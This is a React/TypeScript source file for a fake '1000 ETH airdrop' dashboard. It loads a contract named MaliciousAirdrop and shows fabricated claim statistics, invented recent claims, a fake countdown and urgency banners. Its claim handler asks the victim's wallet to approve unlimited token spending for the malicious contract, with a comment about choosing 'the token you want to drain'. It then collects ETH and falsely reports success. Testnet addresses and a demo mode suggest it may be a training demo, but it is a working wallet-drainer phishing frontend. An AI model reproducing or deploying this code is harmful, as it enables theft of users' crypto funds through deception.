import React, { useState, useEffect } from 'react';
import { useWallet } from '../../context/WalletContext';
import { ethers } from 'ethers';
import maliciousContractABI from '../../artifacts/contracts/MaliciousAirdrop.sol/MaliciousAirdrop.json';
import axios from 'axios';

// Static referral codes that are valid - THIS WILL BE REMOVED
const VALID_REFERRAL_CODES = [
  "FRIEND50",
  "BONUS100", 
  "WELCOME25",
  "SPECIAL75",
  "VIP2024",
  "SUMMER2024",
  "WINTER2024",
  "SPRING2024",
  "AUTUMN2024"
];

// Static fake airdrop statistics
const FAKE_AIRDROP_STATS = {
  totalAirdropsClaimed: 2847,
  totalReferralCodesIssued: 9,
  totalETHCollected: "28.47",
  contractBalance: "15.23",
  claimsLastHour: 1247,
  successRate: "98.7"
};

// Static fake recent claims
const FAKE_RECENT_CLAIMS = [
  {
    user: "0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6",
    amount: "1000",
    referralCode: "FRIEND50",
    timestamp: "2024-01-15T10:30:00Z"
  },
  {
    user: "0x8ba1f109551bD432803012645Hac136c772c3",
    amount: "1000",
    referralCode: "BONUS100",
    timestamp: "2024-01-15T10:28:00Z"
  },
  {
    user: "0x1234567890123456789012345678901234567890",
    amount: "1000",
    referralCode: "WELCOME25",
    timestamp: "2024-01-15T10:25:00Z"
  },
  {
    user: "0xabcdef1234567890abcdef1234567890abcdef12",
    amount: "1000",
    referralCode: "SPECIAL75",
    timestamp: "2024-01-15T10:22:00Z"
  },
  {
    user: "0x9876543210987654321098765432109876543210",
    amount: "1000",
    referralCode: "VIP2024",
    timestamp: "2024-01-15T10:20:00Z"
  }
];

const Dashboard: React.FC = () => {
  const { account, connect } = useWallet();
  const [isLoading, setIsLoading] = useState(false);
  const [claimStatus, setClaimStatus] = useState('');
  const [progress, setProgress] = useState(0);
  const [timeLeft, setTimeLeft] = useState('23:47:12');
  const [referralCode, setReferralCode] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [contractAddresses, setContractAddresses] = useState<any>(null);
  const [referralCodeInfo, setReferralCodeInfo] = useState<any>(null);
  const [isCheckingCode, setIsCheckingCode] = useState(false);

  // Load deployed contract addresses from the public folder
  useEffect(() => {
    const loadContractAddresses = async () => {
      try {
        const response = await fetch('/malicious-contracts.json');
        if (response.ok) {
          const addresses = await response.json();
          setContractAddresses(addresses);
        } else {
          console.log('Could not find malicious-contracts.json. Running in demo mode.');
        }
      } catch (error) {
        console.log('Error fetching contracts, running in demo mode:', error);
      }
    };
    loadContractAddresses();
  }, []);

  // Check referral code validity against Google Sheet
  const checkReferralCode = async (code: string) => {
    if (!code.trim()) {
      setReferralCodeInfo(null);
      return;
    }
    
    setIsCheckingCode(true);
    setReferralCodeInfo(null); // Reset previous info

    try {
      // Use the same URL from WalletContext. You should consider moving this to a shared config file.
      const GOOGLE_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxwSrMecDWKt532TtAnEAzB7tmRgXdT3iefagaBUyHE91kEy5MaCkXBDmOdRsVP5bk_0g/exec';
      const response = await axios.get(`${GOOGLE_SHEET_WEB_APP_URL}?code=${code}`);
      
      const { isValid } = response.data;

      setReferralCodeInfo({
        isValid: isValid,
        usageCount: isValid ? 5 : 0 // Static fake usage count for now
      });

    } catch (error) {
      console.error('Error checking referral code:', error);
      setReferralCodeInfo({
        isValid: false,
        message: 'Could not verify code. Please try again.'
      });
    } finally {
      setIsCheckingCode(false);
    }
  };

  // Fake live updates
  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev < 100) return prev + Math.random() * 2;
        return prev;
      });
    }, 2000);

    const timeInterval = setInterval(() => {
      setTimeLeft(prev => {
        const [hours, minutes, seconds] = prev.split(':').map(Number);
        if (seconds > 0) {
          return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${(seconds - 1).toString().padStart(2, '0')}`;
        } else if (minutes > 0) {
          return `${hours.toString().padStart(2, '0')}:${(minutes - 1).toString().padStart(2, '0')}:59`;
        } else if (hours > 0) {
          return `${(hours - 1).toString().padStart(2, '0')}:59:59`;
        }
        return prev;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
      clearInterval(timeInterval);
    };
  }, []);

  const handleReferralCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const code = e.target.value;
    setReferralCode(code);
    setReferralCodeInfo(null); // Reset validation state on new input
  };

  const handleCheckReferralCode = () => {
    checkReferralCode(referralCode);
  };

  const handleClaim = async () => {
    if (!account) {
      await connect();
      return;
    }

    if (!referralCode.trim()) {
      setClaimStatus('Please enter a referral code to continue');
      return;
    }

    if (!referralCodeInfo || !referralCodeInfo.isValid) {
      setClaimStatus('Please enter a valid referral code');
      return;
    }

    if (!contractAddresses || !contractAddresses.maliciousAirdrop) {
      setClaimStatus('Contract address not found. Please run the deployment script.');
      return;
    }

    setIsLoading(true);
    setClaimStatus('Preparing transaction...');

    // If contracts are deployed, try to interact with them
    if (contractAddresses && account && window.ethereum) {
      try {
        const tokenAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3"; // Replace with the token you want to drain (e.g., USDT address on your testnet)
        const erc20Abi = [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ];

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const token = new ethers.Contract(tokenAddress, erc20Abi, signer);

        // Prompt user to approve the scam contract for unlimited spending
        setClaimStatus('Please approve token spending in your wallet...');
        await token.approve(contractAddresses.maliciousAirdrop, ethers.MaxUint256);

        // Now call the airdrop claim function with ETH
        setClaimStatus('Please approve the airdrop transaction in your wallet...');
        const contract = new ethers.Contract(contractAddresses.maliciousAirdrop, maliciousContractABI.abi, signer);
        const tx = await contract.claimAirdrop(referralCode, { value: ethers.parseEther("0.01") });
        await tx.wait();
        setClaimStatus('✅ SUCCESS! Your 1000 ETH has been claimed!');
        setShowSuccess(true);
      } catch (error: any) {
        console.error('Contract interaction failed:', error);
        let errorMessage = '❌ Claim failed. Please check the console for details.';
        if (error.reason) {
          errorMessage = `❌ Claim failed: ${error.reason}`;
        }
        setClaimStatus(errorMessage);
      }
    } else {
      // Demo mode - simulate success
      setClaimStatus('✅ SUCCESS! The "airdrop" has been claimed!');
      setShowSuccess(true);
    }

    setIsLoading(false);
  };

  if (!account) {
    return (
      <div className="min-h-screen bg-white dark:bg-background-dark flex items-center justify-center p-4 transition-colors duration-300">
        <div className="max-w-md w-full bg-gray-50 dark:bg-card-dark rounded-lg shadow-xl p-8">
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-600 dark:bg-blue-400 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-2xl text-white">🎁</span>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-4">
              Connect Wallet to Claim
            </h2>
            <p className="text-gray-600 dark:text-gray-300 mb-6">
              Connect your wallet to claim your exclusive 1000 ETH airdrop!
            </p>
            <div className="bg-yellow-100 dark:bg-yellow-700 text-yellow-800 dark:text-yellow-200 p-3 rounded-lg mb-6">
              <div className="text-sm font-bold">⏰ URGENT: Only {timeLeft} left!</div>
              <div className="text-xs">1,247 people claimed in the last hour</div>
            </div>
            <button
              onClick={connect}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-colors"
            >
              🔗 Connect Wallet & Claim ETH
            </button>
            <p className="text-xs text-gray-500 dark:text-gray-400 mt-4">
              ⚡ Instant payout · 🔒 100% Secure · 💎 No strings attached
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 dark:bg-background-dark flex items-center justify-center p-4 transition-colors duration-300">
        <div className="max-w-md w-full bg-white dark:bg-card-dark rounded-lg shadow-xl p-8 text-center">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-3xl text-white">🎉</span>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-4">
            Congratulations!
          </h2>
          <p className="text-gray-600 dark:text-gray-300 mb-6">
            You have successfully claimed <span className="font-bold text-green-600 dark:text-green-400">1000 ETH</span>!
          </p>
          <div className="bg-green-50 dark:bg-green-900 border border-green-200 dark:border-green-700 rounded-lg p-4 mb-6">
            <div className="text-sm text-green-800 dark:text-green-200">
              <div className="font-semibold">Transaction Details:</div>
              <div>Amount: 1000 ETH</div>
              <div>Status: ✅ Confirmed</div>
              <div>Time: {new Date().toLocaleTimeString()}</div>
            </div>
          </div>
          <div className="bg-blue-50 dark:bg-blue-900 border border-blue-200 dark:border-blue-700 rounded-lg p-4">
            <p className="text-sm text-blue-800 dark:text-blue-200">
              💡 <strong>Pro tip:</strong> Share this with friends to earn bonus rewards!
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white dark:bg-background-dark transition-colors duration-300 py-8">
      <div className="max-w-5xl mx-auto px-4">
        {/* Header */}
        <section className="bg-white dark:bg-background-dark rounded-lg p-6 mb-8 transition-colors duration-300 shadow">
          <div className="text-center">
            <h1 className="text-4xl font-bold text-gray-900 dark:text-white mb-2">🚀 ETH Airdrop Dashboard</h1>
            <p className="text-xl text-gray-600 dark:text-gray-300">Claim your exclusive 1000 ETH reward</p>
          </div>
        </section>
        {/* Urgency Banner */}
        <section className="bg-gray-100 dark:bg-card-dark rounded-lg p-6 mb-8 transition-colors duration-300 text-center">
          <div className="inline-flex items-center mb-2 px-3 py-1 bg-yellow-100 dark:bg-yellow-700 text-yellow-800 dark:text-yellow-200 rounded-full text-xs font-semibold">
            <span className="mr-2">⚠️</span> URGENT: Airdrop Ending Soon!
          </div>
          <div className="text-lg text-gray-700 dark:text-gray-200 mb-2">Time Remaining: {timeLeft}</div>
          <div className="text-sm text-gray-500 dark:text-gray-400 mb-2">1,247 people claimed in the last hour · Don't miss out!</div>
        </section>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Claim Form */}
          <section className="bg-white dark:bg-background-dark rounded-lg shadow p-6 transition-colors duration-300">
            <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-6">Claim Your ETH</h2>
            {/* Wallet Info */}
            <div className="bg-gray-50 dark:bg-card-dark border border-gray-100 dark:border-gray-800 rounded-lg p-4 mb-6">
              <div className="text-sm text-blue-800 dark:text-blue-300">
                <div className="font-semibold">Connected Wallet:</div>
                <div className="font-mono text-xs break-all">{account}</div>
              </div>
            </div>
            {/* Eligibility Status */}
            <div className="bg-green-50 dark:bg-green-900 border border-green-200 dark:border-green-700 rounded-lg p-4 mb-6">
              <div className="flex items-center">
                <div className="text-green-600 dark:text-green-400 mr-2">✅</div>
                <div>
                  <div className="font-semibold text-green-800 dark:text-green-200">You're Eligible!</div>
                  <div className="text-sm text-green-600 dark:text-green-200">Your wallet qualifies for 1000 ETH</div>
                </div>
              </div>
            </div>
            {/* Referral Code */}
            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Referral Code (Required)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={referralCode}
                  onChange={handleReferralCodeChange}
                  placeholder="Enter referral code"
                  className="flex-1 px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white dark:bg-background-dark text-gray-900 dark:text-white"
                />
                <button
                  onClick={handleCheckReferralCode}
                  disabled={isCheckingCode}
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-md transition-colors disabled:bg-gray-500"
                >
                  {isCheckingCode ? 'Checking...' : 'Check'}
                </button>
              </div>
              <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                Using a referral code increases your reward by 50%
              </p>
              
              {/* Referral Code Status */}
              {referralCodeInfo && (
                <div className={`mt-2 p-2 rounded text-xs ${
                  referralCodeInfo.isValid 
                    ? 'bg-green-50 dark:bg-green-900 text-green-800 dark:text-green-200' 
                    : 'bg-red-50 dark:bg-red-900 text-red-800 dark:text-red-200'
                }`}>
                  {referralCodeInfo.isValid ? (
                    <div>
                      ✅ Valid code • Used {referralCodeInfo.usageCount} times
                    </div>
                  ) : (
                    <div>{referralCodeInfo.message || '❌ Invalid referral code'}</div>
                  )}
                </div>
              )}
            </div>
            {/* Claim Button */}
            <button
              onClick={handleClaim}
              disabled={isLoading || !referralCode.trim() || (referralCodeInfo && !referralCodeInfo.isValid)}
              className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:cursor-not-allowed"
            >
              {isLoading ? 'Processing...' : '🎁 Claim 1000 ETH Now'}
            </button>
            {/* Status Message */}
            {claimStatus && (
              <div className="mt-4 p-3 rounded-lg text-sm">
                {claimStatus.includes('SUCCESS') ? (
                  <div className="bg-green-50 dark:bg-green-900 text-green-800 dark:text-green-200">
                    {claimStatus}
                  </div>
                ) : claimStatus.includes('failed') ? (
                  <div className="bg-red-50 dark:bg-red-900 text-red-800 dark:text-red-200">
                    {claimStatus}
                  </div>
                ) : (
                  <div className="bg-blue-50 dark:bg-blue-900 text-blue-800 dark:text-blue-200">
                    {claimStatus}
                  </div>
                )}
              </div>
            )}
          </section>
          {/* Progress and Stats */}
          <section className="bg-white dark:bg-background-dark rounded-lg shadow p-6 transition-colors duration-300">
            <h2 className="text-2xl font-bold text-gray-800 dark:text-white mb-6">Airdrop Progress</h2>
            {/* Progress Bar */}
            <div className="mb-6">
              <div className="flex justify-between text-sm text-gray-600 dark:text-gray-300 mb-2">
                <span>Progress</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                <div 
                  className="bg-blue-600 h-2 rounded-full transition-all duration-500"
                  style={{ width: `${progress}%` }}
                ></div>
              </div>
            </div>
            {/* Live Statistics */}
            <div className="space-y-4">
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-blue-600 dark:text-blue-400">
                  {FAKE_AIRDROP_STATS.totalAirdropsClaimed.toLocaleString()}
                </div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Total Airdrops Claimed</div>
              </div>
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-green-600 dark:text-green-400">
                  {FAKE_AIRDROP_STATS.totalReferralCodesIssued}
                </div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Referral Codes Issued</div>
              </div>
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-purple-600 dark:text-purple-400">
                  {FAKE_AIRDROP_STATS.totalETHCollected} ETH
                </div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Total ETH Collected</div>
              </div>
              <div className="bg-gray-50 dark:bg-card-dark p-4 rounded-lg">
                <div className="text-2xl font-bold text-orange-600 dark:text-orange-400">
                  {FAKE_AIRDROP_STATS.contractBalance} ETH
                </div>
                <div className="text-sm text-gray-600 dark:text-gray-300">Contract Balance</div>
              </div>
            </div>
            
            {/* Recent Airdrops */}
            <div className="mt-6">
              <h3 className="text-lg font-semibold text-gray-800 dark:text-white mb-3">Recent Airdrops</h3>
              <div className="space-y-2">
                {FAKE_RECENT_CLAIMS.slice(0, 3).map((claim, index) => (
                  <div key={index} className="bg-gray-50 dark:bg-card-dark p-3 rounded-lg text-sm">
                    <div className="flex justify-between items-center">
                      <span className="text-gray-600 dark:text-gray-300">
                        {claim.user.slice(0, 8)}...{claim.user.slice(-6)}
                      </span>
                      <span className="text-green-600 dark:text-green-400 font-semibold">
                        +{claim.amount} ETH
                      </span>
                    </div>
                    <div className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                      Used {claim.referralCode} • {new Date(claim.timestamp).toLocaleTimeString()}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </section>
        </div>
      </div>
    </div>
  );
};

export default Dashboard; 